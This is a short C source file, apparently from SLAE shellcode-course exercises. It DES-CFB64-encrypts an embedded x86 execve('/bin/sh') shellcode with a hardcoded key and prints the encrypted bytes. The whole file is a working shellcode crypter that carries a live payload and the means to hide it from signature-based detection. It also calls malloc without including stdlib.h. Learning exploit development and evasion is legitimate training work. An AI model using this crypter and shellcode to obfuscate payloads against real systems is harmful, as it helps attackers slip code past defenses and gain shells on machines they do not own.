#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <openssl/des.h>
  
char* _crypt(char *key, char *str, int size)
{
    static char *sc;
    int num=0;
    DES_cblock keycopy;
    DES_key_schedule schedule;
    sc = (char *)malloc(size);
    memcpy(keycopy, key, 8); //des_cblock MUST BE 8 bytes
    DES_set_odd_parity(&keycopy);
    DES_set_key_checked(&keycopy, &schedule);
    DES_cfb64_encrypt((unsigned char *)str, (unsigned char *)sc, size, &schedule, &keycopy, &num, DES_ENCRYPT );
    return (sc);
}
 
int main(void) {
    char key[]="slae_3_2"; //MUST BE 8 CHAR LONG (see comment above)
    //execve /bin/sh
    char shellcode[]=\
    	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
    char *enc;
    int len = sizeof(shellcode)-1;
    enc = malloc(len);
    printf("Shellcode lenght:%d \n",len);
    memcpy(enc,_crypt(key,shellcode,len), len);
    int i=0;
    printf("Encrypted shellcode:\n");
    for (i=0; i < len; i++){
     printf("\\x%02x", (unsigned char)enc[i]);
    }
    printf("\n");
}
